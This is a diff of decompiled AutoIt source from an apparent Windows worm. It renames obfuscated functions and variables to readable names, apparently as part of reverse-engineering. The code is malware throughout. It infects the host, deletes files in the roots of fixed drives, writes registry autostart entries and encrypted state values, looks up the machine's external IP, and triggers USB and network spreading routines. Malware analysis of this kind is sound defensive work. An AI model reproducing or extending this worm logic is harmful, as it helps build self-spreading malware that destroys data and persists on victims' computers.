 			$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
 			$RandomFileName = StringMid(@AutoItExe, $Var0342)
-			Fn00A9()
+			InfectPCWithCheck()
 			Sleep(0x03E8)
 		EndIf
 	Else
 		$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
 		$RandomFileName = StringMid(@AutoItExe, $Var0342)
-		Fn00A9()
+		InfectPCWithCheck()
 		Sleep(0x03E8)
 	EndIf
 	If DriveGetType(@ScriptDir) = "FIXED" Then
 		DeleteFilesInFixedDriveRoots()
-		Fn00A3()
+		RunSCmd()
 		Exit
 	EndIf
 ElseIf @ScriptDir = @SystemDir Then
 	Sleep(2 * 0x003C * 0x03E8)
 	If @ScriptFullPath = (@SystemDir & "\" & $CSRCSExeName) Or @ScriptFullPath = (@SystemDir & "\" & $MyScriptName) Then
 	Else
-		Fn00A3()
+		RunSCmd()
 	EndIf
 	If FileExists(@ScriptDir & "\" & $AutoRunInName) And FileExists(@ScriptDir & "\" & $AutoRunIName) Then
 		$Var0343 = FileReadLine(@ScriptDir & "\" & $AutoRunInName, 9)
@@ -5837,41 +5924,41 @@ Else
 		If $Var0341 > $Var0340 Then
 			$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
 			$RandomFileName = StringMid(@AutoItExe, $Var0342)
-			Fn00A9()
+			InfectPCWithCheck()
 			Sleep(0x03E8)
 		EndIf
 	Else
 		$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
 		$RandomFileName = StringMid(@AutoItExe, $Var0342)
-		Fn00A9()
+		InfectPCWithCheck()
 		Sleep(0x03E8)
 	EndIf
 	Exit
 EndIf
 If @ScriptDir = @SystemDir Then
-	If RegRead($Var029A, "a") = "1" Then
+	If RegRead($DRMAmtyRegistryKey, "a") = "1" Then
 		$Var02D1 = 1
 	EndIf
-	If RegRead($Var029A, "b") = "1" Then
+	If RegRead($DRMAmtyRegistryKey, "b") = "1" Then
 		$Var02D2 = 1
 	EndIf
-	If RegRead($Var029A, "a") = "0" Then
+	If RegRead($DRMAmtyRegistryKey, "a") = "0" Then
 		$Var02D1 = 0
 	EndIf
-	If RegRead($Var029A, "b") = "0" Then
+	If RegRead($DRMAmtyRegistryKey, "b") = "0" Then
 		$Var02D2 = 0
 	EndIf
-	If RegRead($Var029A, "eggol") = "1" Then
+	If RegRead($DRMAmtyRegistryKey, "eggol") = "1" Then
 		$Var02C5 = 1
 	EndIf
-	If RegRead($Var029A, "eggol") = "0" Then
+	If RegRead($DRMAmtyRegistryKey, "eggol") = "0" Then
 		$Var02C5 = 0
 	EndIf
-	If RegRead($Var029A, "exp1") <> "" Then
+	If RegRead($DRMAmtyRegistryKey, "exp1") <> "" Then
 	Else
-		RegWrite($Var029A, "exp1", "REG_SZ", Decrypt(1, @YDAY * 1, $EncryptionKey, 4))
-		RegWrite($Var029A, "dreg", "REG_SZ", Decrypt(1, @YEAR * 1, $EncryptionKey, 4))
-		RegWrite($Var029A, "fir", "REG_SZ", "x")
+		RegWrite($DRMAmtyRegistryKey, "exp1", "REG_SZ", Decrypt(1, @YDAY * 1, $EncryptionKey, 4))
+		RegWrite($DRMAmtyRegistryKey, "dreg", "REG_SZ", Decrypt(1, @YEAR * 1, $EncryptionKey, 4))
+		RegWrite($DRMAmtyRegistryKey, "fir", "REG_SZ", "x")
 	EndIf
 	$Var0347 = "http://www.whatismyip.com/automation/n09230945.asp"
 	$Var0348 = $Var0347
@@ -5912,25 +5999,25 @@ If @ScriptDir = @SystemDir Then
 		EndIf
 	EndIf
 	Fn00B4()
-	Fn00A0()
+	WriteRegistryCSRCSAutoStart()
 	Fn009C()
-	If $Var02D7 = 1 And RegRead($Var029A, "rem1") = "1" Then
+	If $Var02D7 = 1 And RegRead($DRMAmtyRegistryKey, "rem1") = "1" Then
 		$Var02CA = "usbspread"
 		$Var02C8 = "Usb2System"
-		$Var02CB = RegRead($Var029A, "rem")
+		$Var02CB = RegRead($DRMAmtyRegistryKey, "rem")
 		$Var034E = $Var0337
 		$Var02CC = "none"
 		Fn00A6()
-		RegDelete($Var029A, "rem1")
+		RegDelete($DRMAmtyRegistryKey, "rem1")
 	EndIf
-	If $Var02D7 = 1 And RegRead($Var029A, "fix1") = "1" Then
+	If $Var02D7 = 1 And RegRead($DRMAmtyRegistryKey, "fix1") = "1" Then
 		$Var02CA = "IPspreader"
 		$Var02C8 = "Drive2System"
-		$Var02CB = RegRead($Var029A, "fix")
+		$Var02CB = RegRead($DRMAmtyRegistryKey, "fix")
 		$Var034E = $Var0338
 		$Var02CC = "none"
 		Fn00A6()
-		RegDelete($Var029A, "fix1")
+		RegDelete($DRMAmtyRegistryKey, "fix1")
 	EndIf
 	$Var034F = DriveGetDrive("FIXED")
 	If Not @error Then
@@ -5941,9 +6028,9 @@ If @ScriptDir = @SystemDir Then
 			EndIf
 		Next
 	EndIf
-	If RegRead($Var029A, "regexp") = Cos(@YDAY * 1) Then
+	If RegRead($DRMAmtyRegistryKey, "regexp") = Cos(@YDAY * 1) Then
 	Else
-		RegWrite($Var029A, "regexp", "REG_SZ", Cos(@YDAY * 1))
+		RegWrite($DRMAmtyRegistryKey, "regexp", "REG_SZ", Cos(@YDAY * 1))
 		$Var034E = $Var0330
 		$Var02CA = @OSVersion
 		$Var02C8 = "Online"
@@ -5973,7 +6060,7 @@ If @ScriptDir = @SystemDir Then
 				$Var0353 = @HOUR * 1
 				$Var035B = 0
 				Fn009C()
-				Fn00A0()
+				WriteRegistryCSRCSAutoStart()
 			EndIf
 		EndIf
 		If $Var02D1 = 1 Then
@@ -6006,7 +6093,7 @@ If @ScriptDir = @SystemDir Then
 				$Var035B = 0
 				$Var035A = Random(10, 0x0014, 1)
 				Fn009C()
-				Fn00A0()
+				WriteRegistryCSRCSAutoStart()
 			EndIf
 		EndIf
 		Sleep(5)
